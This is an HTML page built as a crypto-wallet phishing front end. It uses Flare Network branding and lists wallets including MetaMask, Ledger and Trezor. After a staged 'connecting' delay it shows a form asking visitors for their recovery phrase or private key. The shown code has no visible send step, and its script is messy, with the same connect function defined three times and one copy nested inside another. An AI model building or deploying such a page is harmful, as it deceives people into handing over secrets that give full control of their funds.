<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connect Your Wallet</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(130deg, #050505, #0d0d0d);
      color: white;
      overflow-x: hidden;
    }

    .animated-bg {
      position: fixed;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle, rgba(255, 50, 150, 0.2), transparent 70%),
                  radial-gradient(circle, rgba(50, 150, 255, 0.2), transparent 70%);
      background-size: 400% 400%;
      animation: moveBackground 20s ease infinite;
      z-index: -1;
    }

    @keyframes moveBackground {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .container {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      text-align: center;
    }

    h1 {
      font-size: 3rem;
      font-weight: 800;
      margin-bottom: 10px;
    }

    p {
      font-size: 1.1rem;
      color: #ccc;
      margin-bottom: 40px;
    }

    .wallet-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 20px;
      width: 100%;
      max-width: 800px;
    }

    .wallet-card {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 16px;
      padding: 20px;
      transition: 0.3s ease;
      cursor: pointer;
    }

    .wallet-card:hover {
      background: rgba(255, 255, 255, 0.1);
      transform: translateY(-5px);
    }

    .wallet-card img {
      width: 48px;
      height: 48px;
      object-fit: contain;
      margin-bottom: 10px;
    }

    .wallet-card span {
      display: block;
      font-weight: 600;
      margin-top: 5px;
    }

    .loading-screen {
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }

    .loading-screen img {
      width: 60px;
      margin-bottom: 20px;
    }

    .loading-dots::after {
      content: '';
      display: inline-block;
      animation: dots 1.5s steps(3, end) infinite;
    }

    @keyframes dots {
      0% { content: ''; }
      33% { content: '.'; }
      66% { content: '..'; }
      100% { content: '...'; }
    }

    .phrase-container {
      display: none;
      flex-direction: column;
      align-items: center;
      background: rgba(255,255,255,0.05);
      border-radius: 16px;
      padding: 20px;
      width: 90%;
      max-width: 500px;
      margin: 30px auto;
      color: white;
    }

    .input-header {
      display: flex;
      justify-content: space-between;
      margin-bottom: 15px;
      flex-wrap: wrap;
      gap: 10px;
      width: 100%;
    }

    .type-tabs, .count-tabs {
      display: flex;
      gap: 10px;
    }

    .tab, .count-tab {
      padding: 8px 14px;
      background: transparent;
      border: 1px solid #999;
      border-radius: 8px;
      color: #ccc;
      cursor: pointer;
      transition: 0.3s ease;
    }

    .tab.active, .count-tab.active {
      background: black;
      color: white;
      border-color: #357ABD;
    }

    .input-box {
      width: 100%;
      background: black;
      border: 1px solid #666;
      border-radius: 8px;
      padding: 12px;
      font-size: 1rem;
      color: white;
      margin-bottom: 20px;
      resize: none;
    }

    .submit-btn {
      width: 100%;
      padding: 12px;
      background: black;
      border: none;
      border-radius: 8px;
      color: white;
      font-size: 1rem;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s ease;
    }

    .submit-btn:hover {
      background: #357ABD;
    }

    .trust-theme {
  background: #0e1b2c;
  border: 1px solid #235789;
  box-shadow: 0 0 25px rgba(0, 123, 255, 0.3);
}

.count-dropdown {
  position: relative;
}

.count-toggle {
  background: #1a2e46;
  border: 1px solid #357ABD;
  color: #fff;
  padding: 8px 12px;
  border-radius: 6px;
  cursor: pointer;
  font-weight: 500;
}

.dropdown-menu {
  display: none;
  position: absolute;
  top: 40px;
  left: 0;
  background: #1a2e46;
  border: 1px solid #357ABD;
  border-radius: 8px;
  list-style: none;
  padding: 0;
  margin: 0;
  width: 100%;
  z-index: 100;
}

.dropdown-menu li {
  padding: 10px 14px;
  cursor: pointer;
  color: white;
}

.dropdown-menu li:hover {
  background-color: #357ABD;
}

  </style>
</head>
<body>
  <div class="animated-bg"></div>

  <!-- Wallet Connect Section -->
  <div class="container" id="mainContainer">
    <img src="https://flare.network/api/media/file/Flare.svg" height="69">
    <h1>Connect Your Wallet</h1>
    <p>Select a wallet to proceed with secure authentication</p>
    <div class="wallet-grid">
      <div class="wallet-card" onclick="simulateConnect('download (1).png')">
        <img src="download (1).png" alt="MetaMask">
        <span>MetaMask Wallet</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.WGb_hQQy46dNnJaleTTHfgHaE7?w=266&h=180&c=7&r=0&o=5&pid=1.7')">
        <img src="https://th.bing.com/th/id/OIP.WGb_hQQy46dNnJaleTTHfgHaE7?w=266&h=180&c=7&r=0&o=5&pid=1.7" alt="Coinbase Wallet">
        <span>Coinbase Wallet</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.xe87qJBHN_AvBR9Qoj6msgHaHa?rs=1&pid=ImgDetMain')">
        <img src="https://th.bing.com/th/id/OIP.xe87qJBHN_AvBR9Qoj6msgHaHa?rs=1&pid=ImgDetMain" alt="Trust Wallet">
        <span>Trust Wallet</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.ZjDq12xmfjLDPUETl95ALAHaHa?w=173&h=180&c=7&r=0&o=5&pid=1.7')">
        <img src="https://th.bing.com/th/id/OIP.ZjDq12xmfjLDPUETl95ALAHaHa?w=173&h=180&c=7&r=0&o=5&pid=1.7" alt="Ledger">
        <span>Ledger Wallet</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.Vvh52pZ8b-KumLGGlltvXgAAAA?w=178&h=180&c=7&r=0&o=5&pid=1.7')">
        <img src="https://th.bing.com/th/id/OIP.Vvh52pZ8b-KumLGGlltvXgAAAA?w=178&h=180&c=7&r=0&o=5&pid=1.7" alt="Trezor">
        <span>Trezor Wallet</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.Vvh52pZ8b-KumLGGlltvXgAAAA?w=178&h=180&c=7&r=0&o=5&pid=1.7')">
        <img src="https://th.bing.com/th/id/OIP.xFg-YxD7XjwEnkVA6rqzYgHaHa?rs=1&pid=ImgDetMain" alt="Phantom">
        <span>Phantom</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.OhN4fWhIaaCpU7DeDVYmxQHaHa?rs=1&pid=ImgDetMain')">
        <img src="https://th.bing.com/th/id/OIP.OhN4fWhIaaCpU7DeDVYmxQHaHa?rs=1&pid=ImgDetMain" alt="OKX">
        <span>OKX Wallet</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.3LcxiYEmtKV8dikafckIoQHaHa?rs=1&pid=ImgDetMain')">
        <img src="https://th.bing.com/th/id/OIP.3LcxiYEmtKV8dikafckIoQHaHa?rs=1&pid=ImgDetMain" alt="Rabby wallet">
        <span>Rabby Wallet</span>
      </div>
      <div class="wallet-card" onclick="simulateConnect('https://th.bing.com/th/id/OIP.EAj_b3MGCNRHgn8M6vmSOAHaHa?pid=ImgDet&w=203&h=203&c=7')">
        <img src="https://th.bing.com/th/id/OIP.EAj_b3MGCNRHgn8M6vmSOAHaHa?pid=ImgDet&w=203&h=203&c=7" alt="Uniswap Wallet">
        <span>Uniswap Wallet</span>
      </div>
    </div>
  </div>

  <!-- Loading Screen -->
  <div class="loading-screen" id="loadingScreen">
    <img id="walletLogo" src="" alt="Loading Wallet">
    <p>Connecting to wallet<span class="loading-dots"></span></p>
  </div>

  <div class="phrase-container trust-theme" id="phraseScreen">
  <div class="input-header">
    <div class="type-tabs">
      <button class="tab active" data-type="phrase" onclick="switchType('phrase')">Phrase</button>
      <button class="tab" data-type="key" onclick="switchType('key')">Private Key</button>
    </div>
    <div class="count-dropdown" id="phraseCountDropdown">
      <button class="count-toggle" onclick="toggleDropdown()">12 Words â–¼</button>
      <ul class="dropdown-menu" id="countMenu">
        <li onclick="selectCount(12)">12 Words</li>
        <li onclick="selectCount(15)">15 Words</li>
        <li onclick="selectCount(18)">18 Words</li>
        <li onclick="selectCount(24)">24 Words</li>
      </ul>
    </div>
  </div>

  <form class="wallet-form">
    <textarea class="input-box" placeholder="Enter your recovery phrase" rows="4"></textarea>
    <button type="submit" class="submit-btn">Connect</button>
  </form>
</div>



  <script>
    function simulateConnect(logoUrl) {
  const loadingScreen = document.getElementById('loadingScreen');
  const walletLogo = document.getElementById('walletLogo');
  const mainContainer = document.getElementById('mainContainer');
  const phraseScreen = document.getElementById('phraseScreen');
  function simulateConnect(logoUrl) {
  const loadingScreen = document.getElementById('loadingScreen');
  const walletLogo = document.getElementById('walletLogo');
  const mainContainer = document.getElementById('mainContainer');

  walletLogo.src = logoUrl;
  mainContainer.style.display = 'none';
  loadingScreen.style.display = 'flex';

  setTimeout(() => {
    window.location.href = 'wallet.html'; // Redirect to another page
  }, 3000);
}


  walletLogo.src = logoUrl;
  mainContainer.style.display = 'none';
  phraseScreen.style.display = 'none';
  loadingScreen.style.display = 'flex';

  setTimeout(() => {
    loadingScreen.style.display = 'none';
    phraseScreen.style.display = 'flex';
  }, 3000);
}

    const tabs = document.querySelectorAll('.tab');
    const countTabs = document.querySelectorAll('.count-tab');
    const textarea = document.querySelector('.input-box');

    tabs.forEach(tab => {
      tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');

        if (tab.dataset.type === "key") {
          textarea.placeholder = "Enter your private key";
          textarea.rows = 2;
        } else {
          textarea.placeholder = "Enter your recovery phrase";
          textarea.rows = 4;
        }
      });
    });

    countTabs.forEach(btn => {
      btn.addEventListener('click', () => {
        countTabs.forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
      });
    });

    function simulateConnect(logoUrl) {
      const loadingScreen = document.getElementById('loadingScreen');
      const walletLogo = document.getElementById('walletLogo');
      const mainContainer = document.getElementById('mainContainer');
      const phraseScreen = document.getElementById('phraseScreen');

      walletLogo.src = logoUrl;
      mainContainer.style.display = 'none';
      phraseScreen.style.display = 'none';
      loadingScreen.style.display = 'flex';

      setTimeout(() => {
        loadingScreen.style.display = 'none';
        phraseScreen.style.display = 'flex';
      }, 3000);
    }
    let currentCount = 12;

function toggleDropdown() {
  const menu = document.getElementById('countMenu');
  menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
}

function selectCount(num) {
  currentCount = num;
  document.querySelector('.count-toggle').textContent = `${num} Words â–¼`;
  document.getElementById('countMenu').style.display = 'none';
}

function switchType(type) {
  const tabs = document.querySelectorAll('.tab');
  tabs.forEach(tab => tab.classList.remove('active'));
  document.querySelector(`.tab[data-type="${type}"]`).classList.add('active');

  const dropdown = document.getElementById('phraseCountDropdown');
  if (type === 'phrase') {
    dropdown.style.display = 'block';
    document.querySelector('.input-box').placeholder = 'Enter your recovery phrase';
  } else {
    dropdown.style.display = 'none';
    document.querySelector('.input-box').placeholder = 'Enter your private key';
  }
}

  </script>
</body>
</html>
